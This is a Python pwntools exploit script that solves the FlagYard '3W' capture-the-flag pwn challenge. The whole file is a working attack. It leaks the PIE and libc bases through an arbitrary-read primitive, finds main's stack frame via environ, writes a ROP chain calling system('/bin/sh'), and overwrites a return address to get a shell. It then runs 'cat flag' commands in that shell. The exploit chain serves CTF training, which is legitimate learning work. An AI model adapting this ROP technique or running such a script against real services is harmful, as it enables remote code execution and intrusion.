#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
3W  -  FlagYard Pwn solver

3w (FlagYard Training Labs, Pwn / SAFCSP) - a Write-What-Where service:
menu Read qword / Write qword with a PIE-base leak in the banner. Convert the
primitive into ROP:

    win leak -> PIE base ; puts@GOT -> libc base ; environ -> stack ptr
    stack scan -> main_rbp ; 4 writes stage chain ; smash write_qword's return
    ret -> pop rsi -> pop rdi -> "/bin/sh" -> system   ->   SHELL -> flag

glibc 2.39, offsets hardcoded. Needs pwntools only.

Target is given as host:port (default tcp.flagyard.com:14160).
"""
from __future__ import annotations

from pwn import *
import re
import sys
import time
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def bar(frac):
    w = 20
    f = max(0.0, min(1.0, frac))
    full = int(round(f * w))
    return "[%s%s] %5.1f%%" % ("\u2588" * full, "\u2591" * (w - full), f * 100.0)

def step(msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s" % (C.BOLD + color + icon + " ",
                             C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(msg):
    step(msg, icon="\u2713", color=C.GREEN)

def tick(frac, msg):
    """single moving progress line (updates in place via carriage return)."""
    line = ("%s%s %s %s%s%s" %
            (C.BOLD + C.YELLOW + "\u25b6 ",
             C.CYAN + bar(frac) + C.RESET,
             C.DIM, C.BOLD, msg, C.RESET))
    sys.stdout.write("\r  " + line + "   ")
    sys.stdout.flush()

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("3 W   S O L V E R",
              "write-what-where -> ROP -> system(\"/bin/sh\") -> flag"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  " + "\u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono):
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (flag, C.BOLD + C.GREEN, "")])
    _row([(" " * 10, "", ""), ("elapsed %.1f s" % chrono, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def ask_target(argv):
    if len(argv) > 1 and (argv[1].startswith("http") or ":" in argv[1]):
        return argv[1].strip()
    raw = input("  Enter the 3W challenge target (host:port): ").strip()
    return raw or "tcp.flagyard.com:14160"

def parse_target(raw):
    raw = raw.replace("tcp://", "").replace("http://", "").rstrip("/")
    if ":" in raw:
        host, port_s = raw.rsplit(":", 1)
    else:
        host, port_s = raw, "14160"
    return host, int(port_s)

def read_flag(raw):
    if isinstance(raw, bytes):
        raw = raw.decode("utf-8", "replace")
    m = re.search(r"(FlagY\{[^}]+\})", raw)
    return m.group(1) if m else None

# ---------------------------------------------------------------------------
# offsets (this instance's binary / glibc 2.39)
# ---------------------------------------------------------------------------
WIN_OFF   = 0x1f88        # win()                                 -> PIE base
GOT_PUTS  = 0x5f90        # puts@GOT                               -> libc leak
LIB_PUTS   = 0x87be0      # puts
LIB_SYSTEM = 0x58750      # system
LIB_ENVRN  = 0x20ad58     # environ   (stack pointer)
LIB_BINSH  = 0x1cb42f     # "/bin/sh" string
G_RET      = 0x2882f      # ret            (byte inside abort)
G_POP_RSI  = 0x110a7d     # pop rsi; ret   (byte inside waitpid epilogue)
G_POP_RDI  = 0x10f78b     # pop rdi; ret   (byte inside posix_spawn setup)
MAIN_RET   = 0x2a1ca      # main's saved RIP offset into libc (scan signature)


# ---------------------------------------------------------------------------
# interaction helpers
# ---------------------------------------------------------------------------
def menu(io, c):
    io.sendlineafter(b"> ", str(c).encode())

def rd(io, addr):
    menu(io, 1)
    io.sendlineafter(b"Address: ", str(addr).encode())
    io.recvuntil(b"Value: 0x")
    return int(io.recvline().strip().split(b"\n")[0], 16)

def wr(io, addr, val, wait=True):
    menu(io, 2)
    io.sendlineafter(b"Address: ", str(addr).encode())
    io.sendlineafter(b"Value: ", str(val).encode())
    if wait:
        io.recvuntil(b"Done")        # "Done" prints first; rest of menu stays in buffer

def connect(host, port):
    for _ in range(5):
        try:
            return remote(host, port, timeout=10)
        except Exception:
            time.sleep(2)
    return None

def scan_rbp(io, lbase, E, kmax=40000):
    """find main's frame: [S+8]=libc+0x2a1ca, [S-4]==1, [S]=stack ptr."""
    for k in range(kmax):
        c = E - 0x90 - k * 8
        v = rd(io, c + 8) - lbase
        if 0 < v < 0x400000:
            ch = rd(io, c - 4)
            if (ch & 0xffffffff) == 1 and 0x700000000000 < rd(io, c) < 0x800000000000:
                return c
    return None

# ---------------------------------------------------------------------------
# exploit
# ---------------------------------------------------------------------------
def exploit(host, port):
    io = connect(host, port)
    if io is None:
        fail("could not connect to service")
        return None

    # 1) PIE base from the banner's win() reference
    step("leaking PIE base via banner win() reference")
    io.recvuntil(b"Reference: ")
    win = int(io.recvuntil(b"\n", drop=True).strip(), 16)
    base = win - WIN_OFF
    io.recvuntil(b"> ")
    ok("PIE base = %s   (win @ %s)" % (C.YELLOW + hex(base) + C.RESET,
                                       C.YELLOW + hex(win) + C.RESET))

    # 2) arbitrary read of puts@GOT -> libc base
    step("leaking libc via puts@GOT (arbitrary read)")
    puts = rd(io, base + GOT_PUTS)
    lbase = puts - LIB_PUTS
    system = lbase + LIB_SYSTEM
    if lbase & 0xFFF:
        fail("libc base unaligned: 0x%x" % lbase)
        io.close(); return None
    ok("libc base = %s   system = %s" %
       (C.YELLOW + hex(lbase) + C.RESET, C.YELLOW + hex(system) + C.RESET))

    # 3) environ -> stack pointer
    step("reading environ for a stack pointer")
    E = rd(io, lbase + LIB_ENVRN)
    ok("envp[0] = %s" % (C.YELLOW + hex(E) + C.RESET))

    # 4) scan the stack for main's frame (write_qword's return target)
    step("scanning the stack for main's frame (ret + choice signature)")
    mr = scan_rbp(io, lbase, E)
    if mr is None:
        fail("stack scan failed")
        io.close(); return None
    ok("main_rbp = %s" % (C.YELLOW + hex(mr) + C.RESET))

    # 5) stage ROP chain in main's frame, then smash write_qword's return addr
    #    [mr-0x18] ret         (trigger, written LAST)
    #    [mr-0x10] pop rsi;ret (skip [mr-0x8] - main clobbers it w/ choice dword)
    #    [mr-0x00] pop rdi;ret
    #    [mr+0x08] "/bin/sh"
    #    [mr+0x10] system           <- aligned: rsp = mr+0x18 == 8 (mod 16)
    tick(0.25, "staging ROP chain in main's frame")
    wr(io, mr - 0x10, lbase + G_POP_RSI)
    tick(0.45, "staging ROP chain in main's frame")
    wr(io, mr - 0x00, lbase + G_POP_RDI)
    tick(0.65, "staging ROP chain in main's frame")
    wr(io, mr + 0x08, lbase + LIB_BINSH)
    tick(0.80, "staging ROP chain in main's frame")
    wr(io, mr + 0x10, lbase + LIB_SYSTEM)
    ok("chain staged \u2014 system(\"/bin/sh\") ready")

    # 6) trigger: overwrite write_qword's own return address
    step("smashing write_qword return address -> executing ROP")
    wr(io, mr - 0x18, lbase + G_RET, wait=False)
    time.sleep(0.6)

    io.sendline(b"echo PWNED")
    io.sendline(b"cat flag 2>/dev/null || cat flag.txt 2>/dev/null || ls -la")
    data = io.recvrepeat(3)
    sock = (host, port)
    try:
        io.close()
    except Exception:
        pass

    flag = read_flag(data)
    if flag:
        tick(0.95, "shell spawned and flag read")
        return flag
    if b"PWNED" in data or b"uid=" in data:
        return "SHELL OK but flag not seen; raw=%r" % data[:300]
    return "FAILED; raw=%r" % data[:300]


def main() -> None:
    t0 = time.time()
    enable_vt()
    banner()
    context.log_level = "error"

    try:
        raw = ask_target(sys.argv)
    except Exception:
        fail("no challenge target given")
        return
    host, port = parse_target(raw)
    step("target host %s:%d" % (host, port))

    step("connecting to the service")
    flag = exploit(host, port)
    if flag and flag.startswith("FlagY"):
        tick(0.85, "shell spawned and flag read")
        print()
        ok("FLAG = %s" % flag)

        big_flag(flag, time.time() - t0)
        outp = Path(__file__).resolve().parent / "flag_from_3w.txt"
        outp.write_text(flag + "\n", encoding="utf-8")
        print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))
    else:
        fail(str(flag))


if __name__ == "__main__":
    main()